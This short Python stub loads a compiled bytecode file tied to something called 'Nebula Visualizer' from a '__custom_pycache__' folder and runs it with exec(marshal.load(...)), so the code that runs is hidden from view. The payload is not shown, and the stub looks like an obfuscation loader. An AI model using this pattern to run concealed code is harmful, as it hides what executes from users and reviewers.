
import marshal
import os

s = open(os.path.join(os.path.dirname(os.path.realpath(__file__)), '__custom_pycache__', 'Nebula Visualizer_d586be3138a043fb8f7233abfa188fa6.cpython-xxx.pyc'), 'rb')
s.seek(16)
exec(marshal.load(s))
